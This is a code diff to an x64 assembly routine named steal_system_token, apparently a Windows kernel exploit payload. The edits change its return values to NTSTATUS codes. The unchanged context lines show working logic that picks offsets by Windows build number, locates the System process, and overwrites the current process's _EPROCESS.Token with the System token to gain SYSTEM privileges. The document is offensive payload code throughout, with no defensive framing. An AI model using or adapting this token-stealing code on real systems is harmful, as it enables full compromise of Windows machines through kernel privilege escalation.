@@ -38,7 +38,7 @@ steal_system_token PROC PUBLIC
 	jz win8_81                         ; jump if EFLAGS.ZF == 1 to win8_81 label
 	cmp eax, 10d                       ; if (EAX == 10) => Windows 10/Windows 11/Windows Server 2016/Windows Server 2019/Windows Server 2022, set EFLAGS.ZF!
 	jz win10                           ; jump if EFLAGS.ZF == 1 to win10 label
-	xor eax, eax                       ; else OS version must be unsupported so we set RAX to FALSE(0)
+	mov eax, 0C0000001h                ; else OS version must be unsupported so we set RAX to STATUS_UNSUCCESSFUL(0xC0000001)
 	ret                                ; return from procedure
 
 	; Resolve required offsets for Windows 7/Windows Server 2008 R2
@@ -85,7 +85,7 @@ win10:
 	jz win10_20h1_20h2_21h1_21h2       ; jump if EFLAGS.ZF == 1 to win10_20h1_20h2_21h1_21h2 label
 	cmp eax, 19044d                    ; if (EAX == 19044) => Windows 10 2110/21H2, set EFLAGS.ZF!
 	jz win10_20h1_20h2_21h1_21h2       ; jump if EFLAGS.ZF == 1 to win10_20h1_20h2_21h1_21h2 label
-	xor eax, eax                       ; else OS version must be unsupported so we set RAX to FALSE(0)
+	mov eax, 0C0000001h                ; else OS version must be unsupported so we set RAX to STATUS_UNSUCCESSFUL(0xC0000001)
 	ret                                ; return from procedure
 
 	; Resolve required offsets for Windows 10 TS1/Windows 10 TS2/Windows 10 RS1
@@ -178,8 +178,7 @@ search_system_process:
 	mov qword ptr [rcx + r10], rax     ; MEMORY[RCX + R10] = RAX = overwrite current nt!_EPROCESS.Token with System nt!_EPROCESS.Token
 
 	; Return success status to calling procedure
-	xor eax, eax                       ; clear RAX
-	inc eax                            ; set RAX to TRUE(1)
+	xor eax, eax                       ; clear RAX, set RAX to STATUS_SUCCESS(0x00000000)
 	ret                                ; return from procedure
 steal_system_token ENDP
 
